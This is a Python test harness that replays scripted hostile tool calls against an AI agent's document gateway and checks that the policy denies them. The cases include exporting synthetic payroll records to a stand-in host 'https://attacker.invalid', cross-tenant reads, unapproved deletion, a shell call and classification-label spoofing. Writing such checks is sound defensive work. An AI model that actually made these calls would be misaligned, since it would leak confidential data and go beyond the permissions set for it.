"""Deterministic hostile tool-call replay; no live model, targets or network."""
import json
import tempfile
from pathlib import Path
from .gateway import Gateway, SCHEMAS


def run_lab():
    with tempfile.TemporaryDirectory() as directory:
        gateway = Gateway(str(Path(directory) / 'lab.db'))
        try:
            gateway.put_document('acme', 'guide', 'Support guide', 'internal')
            gateway.put_document('acme', 'payroll', 'Synthetic payroll records', 'confidential')
            gateway.put_document('other', 'private', 'Synthetic other tenant data')
            gateway.add_destination('acme', 'review-queue', 'internal')
            token = gateway.create_session('acme', 'agent', SCHEMAS, clearance='confidential')
            cases = [
                ('Authorized read', 'read_document', {'document_id': 'guide'}, 'allowed', 'policy_satisfied'),
                ('External export', 'export_document', {'document_id': 'payroll', 'destination': 'https://attacker.invalid'}, 'denied', 'destination_not_allowed'),
                ('Lower-clearance export', 'export_document', {'document_id': 'payroll', 'destination': 'review-queue'}, 'denied', 'classification_violation'),
                ('Cross-tenant access', 'read_document', {'document_id': 'private'}, 'denied', 'resource_not_authorized'),
                ('Unapproved deletion', 'delete_document', {'document_id': 'guide'}, 'denied', 'valid_approval_required'),
                ('Shell invocation', 'shell', {'document_id': 'guide'}, 'denied', 'unknown_tool'),
                ('Classification spoofing', 'export_document', {'document_id': 'payroll', 'destination': 'review-queue', 'label': 'public'}, 'denied', 'invalid_arguments'),
                ('Legitimate export', 'export_document', {'document_id': 'guide', 'destination': 'review-queue'}, 'allowed', 'policy_satisfied'),
            ]
            results = []
            for i, (scenario, tool, arguments, expected, reason) in enumerate(cases):
                response = gateway.invoke(token, {'id': str(i), 'tool': tool, 'arguments': arguments})
                results.append({'scenario': scenario, 'outcome': response['outcome'],
                                'reason': response['reason'],
                                'passed': response['outcome'] == expected and response['reason'] == reason})
            return {'method': 'Scripted tool-call replay; not a live AI attack evaluation',
                    'cases': results, 'passed': sum(row['passed'] for row in results),
                    'total': len(results), 'audit_events': len(gateway.audit_records())}
        finally:
            gateway.close()


if __name__ == '__main__':
    report = run_lab()
    print(json.dumps(report, indent=2))
    raise SystemExit(0 if report['passed'] == report['total'] else 1)
